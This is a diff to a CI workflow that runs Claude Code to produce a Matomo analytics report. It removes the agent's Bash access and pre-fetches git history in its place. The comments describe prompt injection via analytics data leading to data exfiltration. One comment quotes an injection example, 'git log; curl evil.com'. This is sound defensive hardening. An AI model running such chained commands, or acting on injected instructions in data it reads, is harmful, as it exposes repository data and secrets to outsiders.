@@ -23,16 +23,23 @@ jobs:
           MATOMO_URL: ${{ secrets.MATOMO_URL }}
           MATOMO_TOKEN: ${{ secrets.MATOMO_TOKEN }}
           MATOMO_SITE_ID: ${{ secrets.MATOMO_SITE_ID }}
+      - name: Fetch git context
+        run: |
+          mkdir -p /tmp/git
+          git log --since="3 months ago" --format="commit %h%nAuthor: %an%nDate: %ad%n%n%w(0,4,4)%B" --date=short > /tmp/git/log.txt
+          git log --since="2 weeks ago" --stat --format="commit %h — %s (%ad)%n" --date=short > /tmp/git/recent-changes.txt
+          git shortlog -sn --since="3 months ago" > /tmp/git/contributors.txt
       - name: Install Claude Code
         run: npm install -g @anthropic-ai/claude-code
       - name: Generate analytics report
-        # Restrict git to read-only subcommands — Bash(git *) would allow git push/clone/fetch,
-        # which enables network egress and data exfiltration via prompt injection in analytics data.
+        # No Bash tool — pattern matching on command strings cannot prevent shell metacharacter
+        # injection (e.g. "git log; curl evil.com"), so we pre-fetch git data instead.
         run: |
           claude -p "$(cat scripts/matomo-digest-prompt.txt)" \
-            --tools "Bash,Read,Glob,Grep" \
-            --allowedTools "Bash(git log *),Bash(git diff *),Bash(git show *),Bash(git shortlog *),Bash(git rev-parse *),Bash(git branch *),Read,Glob,Grep" \
+            --tools "Read,Glob,Grep" \
+            --allowedTools "Read,Glob,Grep" \
             --add-dir /tmp/matomo \
+            --add-dir /tmp/git \
             --model claude-sonnet-4-6 \
             --max-turns 15 \
             > /tmp/report.md
